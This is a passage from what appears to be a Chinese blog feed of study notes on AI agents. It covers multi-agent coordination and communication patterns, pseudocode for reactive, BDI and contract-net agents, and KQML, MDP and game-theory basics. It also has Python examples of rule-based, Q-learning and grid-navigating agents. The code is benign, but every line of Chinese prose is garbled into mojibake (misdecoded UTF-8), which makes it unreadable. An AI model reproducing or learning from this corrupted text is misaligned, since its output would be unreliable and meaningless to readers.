‡å’ŒåˆåŒæœºåˆ¶è¿›è¡Œä»»åŠ¡åˆ†é…ã€‚</li><li><strong>é»‘æ¿ç³»ç»Ÿ</strong>ï¼šä»£ç†é€šè¿‡å…±äº«çš„é»‘æ¿è¿›è¡Œä¿¡æ¯äº¤æ¢å’Œåä½œã€‚</li><li><strong>æ‹å–æœºåˆ¶</strong>ï¼šé€šè¿‡æ‹å–æ–¹å¼è¿›è¡Œèµ„æºåˆ†é…å’Œä»»åŠ¡åˆ†é…ã€‚</li></ul></li><li>é€šä¿¡æ¨¡å¼ï¼šå†³å®šäº†ä»£ç†ä¹‹é—´çš„ä¿¡æ¯äº¤æ¢æ–¹å¼ï¼š<ul><li><strong>ç‚¹å¯¹ç‚¹é€šä¿¡</strong>ï¼šä»£ç†ä¹‹é—´ç›´æ¥è¿›è¡Œä¿¡æ¯äº¤æ¢ã€‚</li><li><strong>å¹¿æ’­é€šä¿¡</strong>ï¼šä»£ç†å‘æ‰€æœ‰å…¶ä»–ä»£ç†å‘é€ä¿¡æ¯ã€‚</li><li><strong>å¤šæ’­é€šä¿¡</strong>ï¼šä»£ç†å‘ç‰¹å®šç»„çš„ä»£ç†å‘é€ä¿¡æ¯ã€‚</li></ul></li><li>ç»„ç»‡æ¨¡å¼ï¼šå†³å®šäº†ä»£ç†çš„ç»„ç»‡ç»“æ„å’Œè§’è‰²åˆ†é…ã€‚<ul><li><strong>å±‚æ¬¡ç»“æ„</strong>ï¼šä»£ç†æŒ‰ç…§å±‚æ¬¡è¿›è¡Œç»„ç»‡ï¼Œä¸Šå±‚ä»£ç†è´Ÿè´£åè°ƒå’Œç®¡ç†ä¸‹å±‚ä»£ç†ã€‚</li><li><strong>å¹³é¢ç»“æ„</strong>ï¼šæ‰€æœ‰ä»£ç†å¤„äºåŒä¸€å±‚æ¬¡ï¼Œå…·æœ‰ç›¸åŒçš„æƒåˆ©å’Œè´£ä»»ã€‚</li><li><strong>å›¢é˜Ÿç»“æ„</strong>ï¼šä»£ç†è¢«ç»„ç»‡æˆå¤šä¸ªå›¢é˜Ÿï¼Œæ¯ä¸ªå›¢é˜Ÿè´Ÿè´£ç‰¹å®šçš„ä»»åŠ¡æˆ–åŠŸèƒ½ã€‚</li></ul></li><li>é€‚åº”æ€§æ¨¡å¼ï¼šå†³å®šäº†ä»£ç†å¦‚ä½•åº”å¯¹ç¯å¢ƒå˜åŒ–å’Œä»»åŠ¡å˜åŒ–ã€‚<ul><li><strong>å­¦ä¹ æœºåˆ¶</strong>ï¼šä»£ç†é€šè¿‡å­¦ä¹ ç®—æ³•ï¼ˆå¦‚å¼ºåŒ–å­¦ä¹ ï¼‰æ¥æé«˜æ€§èƒ½ã€‚</li><li><strong>è¿›åŒ–æœºåˆ¶</strong>ï¼šä»£ç†é€šè¿‡è¿›åŒ–ç®—æ³•ï¼ˆå¦‚é—ä¼ ç®—æ³•ï¼‰æ¥ä¼˜åŒ–è¡Œä¸ºã€‚</li><li><strong>è‡ªç»„ç»‡æœºåˆ¶</strong>ï¼šä»£ç†é€šè¿‡è‡ªç»„ç»‡æœºåˆ¶ï¼ˆå¦‚èšç¾¤ä¼˜åŒ–ï¼‰æ¥å®ç°å…¨å±€åè°ƒã€‚</li></ul></li><li>å®‰å…¨ä¸ä¿¡ä»»æ¨¡å¼ï¼šç¡®ä¿ä»£ç†ç³»ç»Ÿçš„å®‰å…¨æ€§å’Œå¯é æ€§ã€‚<ul><li><strong>èº«ä»½è®¤è¯</strong>ï¼šç¡®ä¿ä»£ç†çš„èº«ä»½çœŸå®æ€§ã€‚</li><li><strong>è®¿é—®æ§åˆ¶</strong>ï¼šé™åˆ¶ä»£ç†å¯¹èµ„æºçš„è®¿é—®æƒé™ã€‚</li><li><strong>ä¿¡ä»»ç®¡ç†</strong>ï¼šé€šè¿‡ä¿¡ä»»æ¨¡å‹è¯„ä¼°ä»£ç†çš„å¯ä¿¡åº¦ã€‚</li></ul></li><li><p>ååº”å¼ä»£ç†ï¼šé€šè¿‡ç®€å•çš„æ„ŸçŸ¥-è¡ŒåŠ¨è§„åˆ™è¿›è¡Œå†³ç­–ã€‚</p><ul><li>å“åº”é€Ÿåº¦å¿«ï¼Œé€‚ç”¨äºåŠ¨æ€å˜åŒ–çš„ç¯å¢ƒã€‚</li><li><p>ç¼ºä¹é•¿æœŸè§„åˆ’èƒ½åŠ›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Algorithm ReactiveAgent</span><br><span class="line">  Input: Perception p</span><br><span class="line">  Output: Action a</span><br><span class="line"></span><br><span class="line">  RuleSet R = &#123;r1, r2, ..., rn&#125; // Set of perception-action rules</span><br><span class="line">  for each rule r in R do</span><br><span class="line">    if r.condition(p) is true then</span><br><span class="line">      return r.action</span><br><span class="line">  end for</span><br><span class="line">  return null // No applicable action</span><br></pre></td></tr></table></figure></li></ul></li><li><p>è®¤çŸ¥ä»£ç†ï¼šå…·æœ‰å†…éƒ¨çŠ¶æ€å’Œæ¨ç†èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿›è¡Œå¤æ‚å†³ç­–</p><ul><li>å…·æœ‰å¤æ‚å†³ç­–èƒ½åŠ›ï¼Œé€‚ç”¨äºå¤æ‚ä»»åŠ¡ã€‚</li><li><p>è®¡ç®—å¤æ‚åº¦é«˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Algorithm CognitiveAgent</span><br><span class="line">  Input: Perception p, InternalState s</span><br><span class="line">  Output: Action a</span><br><span class="line"></span><br><span class="line">  BeliefSet B = UpdateBeliefs(p, s)</span><br><span class="line">  DesireSet D = GenerateDesires(B)</span><br><span class="line">  IntentionSet I = SelectIntentions(D)</span><br><span class="line">  Plan P = GeneratePlan(I)</span><br><span class="line">  ExecutePlan(P)</span><br><span class="line">  UpdateState(s, P)</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li></ul></li><li><p>åä½œç®—æ³•ï¼šå®ç°ä»£ç†ä¹‹é—´çš„åä½œã€‚</p><ul><li>çµæ´»æ€§é«˜ï¼Œé€‚ç”¨äºåŠ¨æ€ä»»åŠ¡åˆ†é…ã€‚</li><li><p>é€šä¿¡å¼€é”€å¤§ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Algorithm ContractNet</span><br><span class="line">  Input: Task t</span><br><span class="line">  Output: AssignedAgent a</span><br><span class="line"></span><br><span class="line">  AnnounceTask(t)</span><br><span class="line">  Bids = CollectBids()</span><br><span class="line">  BestBid = SelectBestBid(Bids)</span><br><span class="line">  AssignTask(BestBid.agent, t)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>é€šä¿¡åè®®ï¼šå®šä¹‰ä»£ç†ä¹‹é—´çš„ä¿¡æ¯äº¤æ¢æ ¼å¼</p><p>  KQMLä¼˜ç‚¹ï¼š</p><ul><li>æ ‡å‡†åŒ–ç¨‹åº¦é«˜ï¼Œé€‚ç”¨äºå¼‚æ„ç³»ç»Ÿã€‚</li><li><p>ç¼ºç‚¹æ˜¯å­¦ä¹ æ›²çº¿é™¡å³­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Message KQMLMessage</span><br><span class="line">  Performative: String // e.g., &quot;ask&quot;, &quot;tell&quot;, &quot;achieve&quot;</span><br><span class="line">  Sender: AgentID</span><br><span class="line">  Receiver: AgentID</span><br><span class="line">  Content: String</span><br><span class="line">  Language: String // e.g., &quot;Prolog&quot;, &quot;LISP&quot;</span><br><span class="line">  Ontology: String</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>ä»£ç†å†³ç­–æ¨¡å‹</strong></p><p>é€šå¸¸åŸºäºé©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹ï¼ˆMDPï¼‰ã€‚</p><ul><li>çŠ¶æ€ç©ºé—´ $S$ï¼šä»£ç†å¯èƒ½å¤„äºçš„æ‰€æœ‰çŠ¶æ€çš„é›†åˆã€‚</li><li>åŠ¨ä½œç©ºé—´ $A$ï¼šä»£ç†å¯èƒ½é‡‡å–çš„æ‰€æœ‰åŠ¨ä½œçš„é›†åˆã€‚</li><li>çŠ¶æ€è½¬ç§»å‡½æ•° $P(sâ€™|s,a)$ï¼šåœ¨çŠ¶æ€ $s$ æ‰§è¡ŒåŠ¨ä½œ $a$ åè½¬ç§»åˆ°çŠ¶æ€ $sâ€™$ çš„æ¦‚ç‡ã€‚</li><li>å¥–åŠ±å‡½æ•° $R(s,a)$ï¼šåœ¨çŠ¶æ€ $s$ æ‰§è¡ŒåŠ¨ä½œ $a$ æ‰€è·å¾—çš„å³æ—¶å¥–åŠ±ã€‚</li></ul><p>å¸¸è§çš„åšå¼ˆæ¨¡å‹ï¼š</p><ul><li><strong>é›¶å’Œåšå¼ˆ</strong>ï¼šä¸€ä¸ªä»£ç†çš„æ”¶ç›Šç­‰äºå¦ä¸€ä¸ªä»£ç†çš„æŸå¤±ã€‚</li><li><strong>åˆä½œåšå¼ˆ</strong>ï¼šä»£ç†é€šè¿‡åˆä½œå®ç°å…±åŒåˆ©ç›Šã€‚</li><li><strong>éåˆä½œåšå¼ˆ</strong>ï¼šä»£ç†ç‹¬ç«‹å†³ç­–ä»¥æœ€å¤§åŒ–è‡ªèº«åˆ©ç›Šã€‚<ul><li>çº³ä»€å‡è¡¡ï¼Œè¡¨ç¤ºåœ¨ç»™å®šç­–ç•¥ç»„åˆä¸‹ï¼Œä»»ä½•ä»£ç†éƒ½æ— æ³•é€šè¿‡å•æ–¹é¢æ”¹å˜ç­–ç•¥è€Œè·å¾—æ›´é«˜æ”¶ç›Šã€‚</li></ul></li></ul><p><strong>Agenté—´é€šä¿¡åè®®</strong></p><p>å®šä¹‰äº†Agentä¹‹é—´äº¤æ¢ä¿¡æ¯çš„æ–¹å¼å’Œæ ¼å¼ã€‚</p><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AIå®‰å…¨ </tag>
            
            <tag> AI agent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI_agent_zer0_to_oneï¼ˆä¸€ï¼‰</title>
      <link href="/2025/03/14/AI-agent-zer0-to-one%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2025/03/14/AI-agent-zer0-to-one%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="AI-Agent-æ¦‚è¿°ä¸ç†è®ºåŸºç¡€"><a href="#AI-Agent-æ¦‚è¿°ä¸ç†è®ºåŸºç¡€" class="headerlink" title="AI Agent æ¦‚è¿°ä¸ç†è®ºåŸºç¡€"></a><strong>AI Agent æ¦‚è¿°ä¸ç†è®ºåŸºç¡€</strong></h2><h3 id="AI-Agent-çš„å®šä¹‰-amp-ç‰¹ç‚¹"><a href="#AI-Agent-çš„å®šä¹‰-amp-ç‰¹ç‚¹" class="headerlink" title="AI Agent çš„å®šä¹‰&amp;ç‰¹ç‚¹"></a><strong>AI Agent çš„å®šä¹‰&amp;ç‰¹ç‚¹</strong></h3><p>AI Agentï¼šæ™ºèƒ½ä»£ç†ï¼Œä¸€ç§èƒ½å¤Ÿæ„ŸçŸ¥ç¯å¢ƒå¹¶åœ¨å…¶ä¸­é‡‡å–è¡ŒåŠ¨ä»¥å®ç°ç‰¹å®šç›®æ ‡çš„è®¡ç®—ç³»ç»Ÿ</p><ol><li>äº¤äº’æ–¹å¼ï¼š<ul><li>ä¼ ç»ŸAIç³»ç»Ÿï¼šé€šå¸¸æ˜¯è¢«åŠ¨çš„ï¼Œåªåœ¨æ¥æ”¶åˆ°è¾“å…¥æ—¶æ‰è¿›è¡Œå¤„ç†ã€‚</li><li>AI Agentï¼šä¸»åŠ¨ä¸ç¯å¢ƒäº¤äº’ï¼ŒæŒç»­æ„ŸçŸ¥å’Œè¡ŒåŠ¨ã€‚</li></ul></li><li>å†³ç­–èƒ½åŠ›ï¼š<ul><li>ä¼ ç»ŸAIç³»ç»Ÿï¼šå¾€å¾€åŸºäºé¢„å®šä¹‰çš„è§„åˆ™æˆ–æ¨¡å‹è¿›è¡Œå†³ç­–ã€‚</li><li>AI Agentï¼šèƒ½å¤Ÿæ ¹æ®ç¯å¢ƒå˜åŒ–åŠ¨æ€è°ƒæ•´å†³ç­–ç­–ç•¥ã€‚</li></ul></li><li>å­¦ä¹ èƒ½åŠ›ï¼š<ul><li>ä¼ ç»ŸAIç³»ç»Ÿï¼šå­¦ä¹ èƒ½åŠ›æœ‰é™ï¼Œé€šå¸¸éœ€è¦äººå·¥è°ƒæ•´ã€‚</li><li>AI Agentï¼šå…·æœ‰æŒç»­å­¦ä¹ å’Œè‡ªæˆ‘æ”¹è¿›çš„èƒ½åŠ›ã€‚</li></ul></li><li>ç›®æ ‡å¯¼å‘ï¼š<ul><li>ä¼ ç»ŸAIç³»ç»Ÿï¼šé€šå¸¸ä¸“æ³¨äºè§£å†³ç‰¹å®šé—®é¢˜ã€‚</li><li>AI Agentï¼šèƒ½å¤Ÿå¤„ç†å¤šä¸ªç›®æ ‡ï¼Œå¹¶åœ¨ç›®æ ‡ä¹‹é—´è¿›è¡Œæƒè¡¡ã€‚</li></ul></li><li>é€‚åº”æ€§ï¼š<ul><li>ä¼ ç»ŸAIç³»ç»Ÿï¼šå¯¹ç¯å¢ƒå˜åŒ–çš„é€‚åº”èƒ½åŠ›è¾ƒå¼±ã€‚</li><li>AI Agentï¼šèƒ½å¤Ÿå¿«é€Ÿé€‚åº”æ–°ç¯å¢ƒå’Œæ–°ä»»åŠ¡ã€‚</li></ul></li></ol><h3 id="AI-Agent-çš„ç±»å‹ä¸åº”ç”¨é¢†åŸŸ"><a href="#AI-Agent-çš„ç±»å‹ä¸åº”ç”¨é¢†åŸŸ" class="headerlink" title="AI Agent çš„ç±»å‹ä¸åº”ç”¨é¢†åŸŸ"></a><strong>AI Agent çš„ç±»å‹ä¸åº”ç”¨é¢†åŸŸ</strong></h3><h3 id="åŸºäºè§„åˆ™çš„-Agent"><a href="#åŸºäºè§„åˆ™çš„-Agent" class="headerlink" title="åŸºäºè§„åˆ™çš„ Agent"></a><strong>åŸºäºè§„åˆ™çš„ Agent</strong></h3><p>é€šè¿‡é¢„å®šä¹‰çš„è§„åˆ™æ¥åšå‡ºå†³ç­–å’Œæ‰§è¡Œæ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RuleBasedAgent</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.rules = &#123;</span><br><span class="line">            <span class="string">&quot;sunny&quot;</span>: <span class="string">&quot;å»å…¬å›­&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rainy&quot;</span>: <span class="string">&quot;å¾…åœ¨å®¶&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cloudy&quot;</span>: <span class="string">&quot;å»è´­ç‰©ä¸­å¿ƒ&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decide</span>(<span class="params">self, weather</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.rules.get(weather, <span class="string">&quot;æ— æ³•å†³å®š&quot;</span>)</span><br><span class="line"></span><br><span class="line">agent = RuleBasedAgent()</span><br><span class="line"><span class="built_in">print</span>(agent.decide(<span class="string">&quot;sunny&quot;</span>))  <span class="comment"># è¾“å‡ºï¼šå»å…¬å›­</span></span><br></pre></td></tr></table></figure><h3 id="å­¦ä¹ å‹-Agent"><a href="#å­¦ä¹ å‹-Agent" class="headerlink" title="å­¦ä¹ å‹ Agent"></a><strong>å­¦ä¹ å‹ Agent</strong></h3><p>ä»ç»éªŒä¸­å­¦ä¹ ï¼Œä¸æ–­æ”¹è¿›å…¶æ€§èƒ½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QLearningAgent</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, states, actions, learning_rate=<span class="number">0.1</span>, discount_factor=<span class="number">0.9</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.q_table = np.zeros((states, actions))</span><br><span class="line">        <span class="variable language_">self</span>.lr = learning_rate</span><br><span class="line">        <span class="variable language_">self</span>.gamma = discount_factor</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, state, action, reward, next_state</span>):</span><br><span class="line">        current_q = <span class="variable language_">self</span>.q_table[state, action]</span><br><span class="line">        next_max_q = np.<span class="built_in">max</span>(<span class="variable language_">self</span>.q_table[next_state])</span><br><span class="line">        new_q = current_q + <span class="variable language_">self</span>.lr * (reward + <span class="variable language_">self</span>.gamma * next_max_q - current_q)</span><br><span class="line">        <span class="variable language_">self</span>.q_table[state, action] = new_q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_action</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="keyword">return</span> np.argmax(<span class="variable language_">self</span>.q_table[state])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line">agent = QLearningAgent(states=<span class="number">10</span>, actions=<span class="number">4</span>)</span><br><span class="line">agent.update(state=<span class="number">0</span>, action=<span class="number">1</span>, reward=<span class="number">5</span>, next_state=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="è‡ªä¸»-Agent"><a href="#è‡ªä¸»-Agent" class="headerlink" title="è‡ªä¸» Agent"></a><strong>è‡ªä¸» Agent</strong></h3><p>å…·æœ‰é«˜åº¦çš„ç‹¬ç«‹æ€§ï¼Œèƒ½å¤Ÿåœ¨æ²¡æœ‰ç›´æ¥äººç±»å¹²é¢„çš„æƒ…å†µä¸‹åšå‡ºå†³ç­–å’Œæ‰§è¡Œä»»åŠ¡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AutonomousAgent</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.position = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="variable language_">self</span>.goal = (<span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">        <span class="variable language_">self</span>.obstacles = <span class="built_in">set</span>([(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">3</span>), (<span class="number">4</span>, <span class="number">4</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sense_environment</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># æ¨¡æ‹Ÿç¯å¢ƒæ„ŸçŸ¥</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;current_position&quot;</span>: <span class="variable language_">self</span>.position,</span><br><span class="line">            <span class="string">&quot;nearby_obstacles&quot;</span>: [obs <span class="keyword">for</span> obs <span class="keyword">in</span> <span class="variable language_">self</span>.obstacles <span class="keyword">if</span> <span class="variable language_">self</span>.distance(obs, <span class="variable language_">self</span>.position) &lt; <span class="number">2</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">plan_path</span>(<span class="params">self, env_data</span>):</span><br><span class="line">        <span class="comment"># ç®€åŒ–çš„è·¯å¾„è§„åˆ’</span></span><br><span class="line">        current_pos = env_data[<span class="string">&quot;current_position&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> current_pos == <span class="variable language_">self</span>.goal:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Goal reached&quot;</span></span><br><span class="line">        </span><br><span class="line">        possible_moves = [(<span class="number">1</span>, <span class="number">0</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (<span class="number">0</span>, -<span class="number">1</span>)]</span><br><span class="line">        best_move = <span class="built_in">min</span>(possible_moves, key=<span class="keyword">lambda</span> move: <span class="variable language_">self</span>.distance(</span><br><span class="line">            (current_pos[<span class="number">0</span>] + move[<span class="number">0</span>], current_pos[<span class="number">1</span>] + move[<span class="number">1</span>]),</span><br><span class="line">            <span class="variable language_">self</span>.goal</span><br><span class="line">        ))</span><br><span class="line">        <span class="keyword">return</span> best_move</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_action</span>(<span class="params">self, action</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(action, <span class="built_in">tuple</span>):</span><br><span class="line">            <span class="variable language_">self</span>.position = (<span class="variable language_">self</span>.position[<span class="number">0</span>] + action[<span class="number">0</span>], <span class="variable language_">self</span>.position[<span class="number">1</span>] + action[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.position</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">distance</span>(<span class="params">self, pos1, pos2</span>):</span><br><span class="line">        <span class="keyword">return</span> ((pos1[<span class="number">0</span>] - pos2[<span class="number">0</span>])**<span class="number">2</span> + (pos1[<span class="number">1</span>] - pos2[<span class="number">1</span>])**<span class="number">2</span>)**<span class="number">0.5</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            env_data = <span class="variable language_">self</span>.sense_environment()</span><br><span class="line">            action = <span class="variable language_">self</span>.plan_path(env_data)</span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">&quot;Goal reached&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            new_position = <span class="variable language_">self</span>.execute_action(action)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Moved to <span class="subst">&#123;new_position&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">agent = AutonomousAgent()</span><br><span class="line">agent.run()</span><br></pre></td></tr></table></figure><h2 id="AI-Agent-çš„æ ¸å¿ƒæŠ€æœ¯"><a href="#AI-Agent-çš„æ ¸å¿ƒæŠ€æœ¯" class="headerlink" title=" AI Agent çš„æ ¸å¿ƒæŠ€æœ¯"></a><strong> AI Agent çš„æ ¸å¿ƒæŠ€æœ¯</strong></h2><h3 id="æœºå™¨å­¦ä¹ åŸºç¡€"><a href="#æœºå™¨å­¦ä¹ åŸºç¡€" class="headerlink" title="æœºå™¨å­¦ä¹ åŸºç¡€"></a><strong>æœºå™¨å­¦ä¹ åŸºç¡€</strong></h3><p><strong>ç›‘ç£å­¦ä¹ ï¼š</strong>é€šè¿‡æ ‡è®°æ•°æ®æ¥è®­ç»ƒæ¨¡å‹ï¼Œç›®æ ‡æ˜¯å­¦ä¹ è¾“å…¥åˆ°è¾“å‡ºçš„æ˜ å°„ï¼Œå¸¸ç”¨äºåˆ†ç±»å’Œå›å½’é—®é¢˜ã€‚</p><p><strong>æ— ç›‘ç£å­¦ä¹  ï¼š</strong>å¤„ç†æœªæ ‡è®°çš„æ•°æ®ï¼Œç›®æ ‡æ˜¯å‘ç°æ•°æ®ä¸­çš„éšè—ç»“æ„ã€‚ç›®æ ‡æ˜¯å‘ç°æ•°æ®çš„å†…åœ¨ç»“æ„ï¼Œå¸¸ç”¨äºèšç±»ã€é™ç»´å’Œå¼‚å¸¸æ£€æµ‹ã€‚</p><p><strong>å¼ºåŒ–å­¦ä¹ ï¼š</strong>é€šè¿‡ä¸ç¯å¢ƒäº¤äº’æ¥å­¦ä¹ æœ€ä¼˜ç­–ç•¥çš„æ–¹æ³•ã€‚ç›®æ ‡æ˜¯æœ€å¤§åŒ–ç´¯ç§¯å¥–åŠ±ï¼Œé€‚ç”¨äºåºåˆ—å†³ç­–é—®é¢˜ã€‚</p><ul><li>å…³é”®æ¦‚å¿µï¼š<ul><li>çŠ¶æ€ï¼ˆStateï¼‰</li><li>åŠ¨ä½œï¼ˆActionï¼‰</li><li>å¥–åŠ±ï¼ˆRewardï¼‰</li><li>ç­–ç•¥ï¼ˆPolicyï¼‰</li><li>ä»·å€¼å‡½æ•°ï¼ˆValue Functionï¼‰</li></ul></li></ul><h3 id="æ·±åº¦å­¦ä¹ æŠ€æœ¯"><a href="#æ·±åº¦å­¦ä¹ æŠ€æœ¯" class="headerlink" title="æ·±åº¦å­¦ä¹ æŠ€æœ¯"></a><strong>æ·±åº¦å­¦ä¹ æŠ€æœ¯</strong></h3><p>æ·±åº¦å­¦ä¹ æ˜¯æœºå™¨å­¦ä¹ çš„ä¸€ä¸ªå­é¢†åŸŸï¼Œå®ƒä½¿ç”¨å¤šå±‚ç¥ç»ç½‘ç»œæ¥å­¦ä¹ æ•°æ®çš„å±‚æ¬¡è¡¨ç¤ºã€‚åœ¨AI Agentå¼€å‘ä¸­ï¼Œæ·±åº¦å­¦ä¹ æŠ€æœ¯èƒ½å¤Ÿå¤„ç†é«˜ç»´åº¦ã€éç»“æ„åŒ–çš„æ•°æ®ï¼Œå¦‚å›¾åƒã€éŸ³é¢‘å’Œæ–‡æœ¬ã€‚</p><p><strong>ç¥ç»ç½‘ç»œåŸºç¡€ï¼š</strong>æ·±åº¦å­¦ä¹ çš„åŸºç¡€ï¼Œå®ƒæ¨¡ä»¿äº†äººè„‘çš„ç»“æ„å’ŒåŠŸèƒ½ã€‚</p><ul><li>å…³é”®æ¦‚å¿µï¼š<ul><li>ç¥ç»å…ƒï¼ˆNeuronï¼‰</li><li>æ¿€æ´»å‡½æ•°ï¼ˆActivation Functionï¼‰</li><li>æƒé‡å’Œåç½®ï¼ˆWeights and Biasesï¼‰</li><li>å‰å‘ä¼ æ’­ï¼ˆForward Propagationï¼‰</li><li>åå‘ä¼ æ’­ï¼ˆBackpropagationï¼‰</li></ul></li></ul><p><strong>å·ç§¯ç¥ç»ç½‘ç»œ (CNN)</strong>ï¼šå¤„ç†ç½‘æ ¼ç»“æ„æ•°æ®ï¼ˆå¦‚å›¾åƒï¼‰æ—¶è¡¨ç°å‡ºè‰²<strong>ï¼Œ</strong>å±€éƒ¨è¿æ¥ã€æƒé‡å…±äº«ã€ç©ºé—´æˆ–æ—¶é—´ä¸‹é‡‡æ 